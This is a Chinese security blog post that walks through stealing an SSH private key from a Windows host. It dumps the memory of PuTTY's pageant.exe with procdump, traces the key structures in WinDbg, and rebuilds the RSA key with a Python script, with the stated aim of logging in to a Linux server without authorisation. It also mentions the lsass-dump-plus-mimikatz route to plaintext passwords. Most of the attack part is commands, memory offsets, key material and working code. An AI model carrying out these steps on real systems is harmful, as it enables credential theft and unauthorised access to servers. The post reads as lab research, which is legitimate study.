# Memory Dump利用实例

0x00 前言
=======

* * *

众所周知，procdump可以获得进程的内存dump文件 最常见的用法如下：

```
1、使用procdump抓取lsass进程
2、获得LSASS进程内存dump文件
3、用mimikatz解析dump文件
4、获取主机明文密码

```

那么，我们是否可以大胆设想一下，能否使用procdump抓取其他进程内存文件，进而获得内存中的敏感信息呢？

0x01 目标
=======

* * *

尝试使用procdump获取putty ssh登录的密钥，实现非授权登录目标Linux服务器

0x02 测试环境
=========

* * *

目标：

```
操作系统：Win7 x86
进程：
    putty.exe： SSH 客户端
    pageant.exe：PuTTY的SSH认证代理，用这个可以不用每次登录输入口令

```

使用工具：

```
procdump
windbg 6.3.9600 

```

0x03 环境搭建
=========

* * *

1、工具下载地址：
---------

```
Putty工具集：
http://the.earth.li/~sgtatham/putty/latest/x86/putty.zip

windbg 6.3.9600下载地址：
http://download.csdn.net/detail/ytfrdfiw/8182431

```

2、主机环境配置
--------

**（1）生成密匙**

在目标主机运行puttygen.exe，选择需要的密匙类型和长度，使用默认的SSH2(RSA)，长度设置为1024 点击Save private key 保存公私钥

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/e00f7ffcfe24ea5f3545b4cabdbc750dc922dddb.jpg)

**（2）上传公钥**

登录Linux服务器，然后执行如下命令：

```
$　cd　~
$　mkdir　.ssh
$　chmod　700　.ssh
$　cd　.ssh
$　cat　>　authorized_keys
粘贴公钥
$ chmod 600 authorized_keys

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/3da10f977085336e98a51db6da9d5723acd9fae7.jpg)

**（3）导入私钥实现自动登录**

运行pageant导入私钥，运行putty.exe自动登录

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/458db0f58020de9bd70731a9e138a86fdd75c224.jpg)

![这里写图片描述](http://drops.javaweb.org/uploads/images/61eadbe6dc5bfd6a38a0b697216272167d87f4f9.jpg)

_Tips：_

出现`PuTTY:server refused our key`无法自动登录的解决方法：

禁用系统的`selinux`功能，命令`#setenforce 0`

0x04 实际测试
=========

* * *

1、获取进程pageant的内存文件
------------------

执行：

```
Procdump.exe -accepteula -ma pageant.exe lsass5putty.dmp

```

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/db0b56f52b4ee6350d7e392e3ac282f750c7d045.jpg)

2、使用WinDBG定位内存文件
----------------

使用`Windbg`加载`lsass5putty.dmp`文件，`alt+5`查看内存信息

Tips：

```
WinDbg需要作如下设置：
运行WinDbg->菜单->File->Symbol File Path
在 弹出的框中输入“C:\MyCodesSymbols; SRV*C:\MyLocalSymbols*http://msdl.microsoft.com/download/symbols”(按照这样设置，WinDbg将先从本地文件夹C:\MyCodesSymbols中查找Symbol，如果找不到，则自动从MS的Symbol Server上下载Symbols，文件夹C:\MyCodesSymbols需要提前建立)
否则会出现ERROR: Symbol file could not be found

```

**（1）查看starting offset**

定位`00420d2c`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/652807774acda19cce1c8fcf91fb82a7a16789d1.jpg)

说明：

`00420d2c`为变量`ssh2keys`固定的起始地址

后面提到的结构体参照源码中的`tree234.c`和`sshpubk.c`文件，

研究具体结构执行过程参照c源码就好

源码下载地址：

http://tartarus.org/~simon/putty-snapshots/putty-src.zip

**（2）查看tree234_Tag**

定位`01361f10`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/8071353594af94f97b0ae31d075c79001cf856d2.jpg)

```
struct tree234_Tag{
    node234 *root=013607c0;
    cmpfn234 cmp=0040f0a5;
};

```

**（3）查看node234_Tag**

定位`013607c0`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/21f2716b6dd5486b6cd1c32b71e4e4e1d512e941.jpg)

```
struct node234_Tag{
    node234 *parent=00000000;
    node234 *kids[4]={00000000,00000000,00000000,00000000};
    int counts[4]={00000000,00000000,00000000,00000000};
    void *elems[3]={01364fc8,00000000,00000000};
};

```

**（4）查看elems[0]**

定位`01364fc8`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/eb3e7f99c03013d84fa8f3621269a4204f4221b4.jpg)

```
struct ssh2_userkey{
    const struct ssh_signkey *alg=0041c83c;
    void *data=01360b30;
    char *comment=01360858;
};

```

**（5）确认是否找到ssh2_userkey，查看*comment**

定位`01360858`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/ce9218f8b61c0a20b208fae9ecbf4a111e1abfde.jpg)

发现字符`rsa-key-20150908`

**（6）查看RSAKey，即*data**

定位`01360b30`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/1e22c4493c333cdf686baead9911083bf343ad4d.jpg)

```
struct RSAKey{
    int bits=01363f38;
    int bytes=013600c4;
    Bignum modulus=01360b70;
    Bignum exponent=01360b60;
    Bignum private_expinent=01363f38;
    Bignum p=01363fc8;
    Bignum q=01364018;
    Bignum iqmp=01364068;
    char *comment=00000000;
};

```

**（7）获取RSA key**

RSA key格式：

```
Construct an RSA key object from a tuple of valid RSA components.
See RSAImplementation.construct.

Parameters:
 tup (tuple) - A tuple of long integers, with at least 2 and no more than 6 items. The items come in the following order:

 RSA modulus (n).
 Public exponent (e).
 Private exponent (d). Only required if the key is private.
 First factor of n (p). Optional.
 Second factor of n (q). Optional.
 CRT coefficient, (1/p) mod q (u). Optional.
Returns:
 An RSA key object (_RSAobj).

```

**RSA modulus:**

定位`01360b70`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/8bc56cfcffd283c1086642e6a9797d8b6639a614.jpg)

第一位`00000020`表示读取长度，转为10进制为32,读取长度为32

`RSA modulus`为

```
004b8e2f be2db5f7 575b3f42 3b9b6774 f0924e40 1418b4a9 7af433cf
4df68526 e2866be4 6ba6a84d b49941c8 ea8462d9 b5ca8e6d 555a0f1b 3b084437
066a5319 65a69b95 c596daa8 ab89949e 1823d812 cdff4adb 6efe09cc 003d765c
925d10c5 2aabc14e 71f7621d fa84e9ed 8d8da1b0 9a156896 c41a0d2f b95f8c7d
5aa2ae5a

```

**Public exponent:**

定位`01360b60`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/714ef57693174e08b18cabe2e7739ed111e0ebc3.jpg)

第一位00000001表示读取长度，转为10进制为1，读取长度为1

Public exponent为0x25

**Private exponent:**

定位`01363f38`

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/79b07245a19b5a3ca6a1355815efd1bc72838aa6.jpg)

第一位00000020表示读取长度，转为10进制为32，读取长度为32

Private exponent为

```
6c5c9ead 1f5b1e50 47b1b98e 231ed4b9 a2319931 24f1ebda 9650c9fd
44735efe 7dce99ee de1bb6d9 b6e28e4b ad7f096a 0fa86baf 1f9ffb4d de181a88
fedb8599 47efbf03 d4e866c6 04a2da80 6f5aea2a 51acf42f 02fff26d e454b02c
8e558ad4 2aaab232 4159b68b e42d1b14 1f805e50 1fd710aa 88c26f0f 12d911a2
02731978

```

**（8）生成RSA key**

```
import sys
import base64
from Crypto.PublicKey import RSA

def string_to_long(data):
    data = data.split(' ')
    data.reverse()
    return long(("".join(data)),16)

if __name__ == "__main__":
    #setup the primitives
    rsamod = string_to_long('004b8e2f be2db5f7 575b3f42 3b9b6774 f0924e40 1418b4a9 7af433cf 4df68526 e2866be4  6ba6a84d b49941c8 ea8462d9 b5ca8e6d 555a0f1b 3b084437 066a5319 65a69b95 c596daa8 ab89949e 1823d812 cdff4adb 6efe09cc 003d765c 925d10c5 2aabc14e 71f7621d fa84e9ed 8d8da1b0 9a156896 c41a0d2f b95f8c7d 5aa2ae5a')
    rsapubexp = long(0x25)
    rsaprivexp = string_to_long('6c5c9ead 1f5b1e50 47b1b98e 231ed4b9 a2319931 24f1ebda 9650c9fd 44735efe 7dce99ee de1bb6d9 b6e28e4b ad7f096a 0fa86baf 1f9ffb4d de181a88 fedb8599 47efbf03 d4e866c6 04a2da80 6f5aea2a 51acf42f 02fff26d e454b02c 8e558ad4 2aaab232 4159b68b e42d1b14 1f805e50 1fd710aa 88c26f0f 12d911a2 02731978')
    rawkey = (rsamod,rsapubexp,rsaprivexp)
    #construct the desired RSA key
    rsakey = RSA.construct(rawkey)
    #print the object, publickey, privatekey
    print rsakey    
    print rsakey.publickey().exportKey('PEM')
    print rsakey.exportKey('PEM')
    print 'OpenSSH format Public:'
    print rsakey.publickey().exportKey('OpenSSH')

```

保存为a.py后执行得到公私钥

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/e0502864d711f0374d946693235c362c3826d10d.jpg)

同puttygen.exe生成的公钥做对比

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/e4472ac75ad09d4c143315f5a28c1028c05606aa.jpg)

_Tips：_

```
此段python脚本使用print rsakey.publickey().exportKey('OpenSSH')输出验证公钥的正确
私钥无法使用print rsakey.exportKey('OpenSSH')输出

```

原因如下：

如图

![这里写图片描述](http://drops.javaweb.org/uploads/images/1604ec7e5806fd250956216f0d3383840f1ace63.jpg)

3、利用获取的私钥远程登录
-------------

0x05 补充
=======

* * *

```
https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/
http://www.oschina.net/translate/stealing-unencrypted-ssh-agent-keys-from-memory
http://drops.wooyun.org/tips/2719

```

如上链接，之前有人介绍过“从内存中窃取未加密的SSH-agent密钥”，但该方法是针对linxu环境的内存dump，通过python脚本直接解析 而本文实例是对windows下使用procdump抓取进程内存文件，进而获得内存中的敏感信息的一种尝试探索，全部操作过程完全可以使用一个py文件实现。 参考链接：

```
http://www.poluoluo.com/server/201107/138424.html
http://blog.sina.com.cn/s/blog_5f5e2ce50101788l.html
https://www.dlitz.net/software/pycrypto/api/current/
https://diablohorn.wordpress.com/2015/09/04/discovering-the-secrets-of-a-pageant-minidump/

```

0x06 小结
=======

* * *

本文仅测试了putty&pageant的内存密钥获取，证明了思路的正确 更多测试持续进行中

本文由三好学生原创并首发于乌云知识库，转载请注明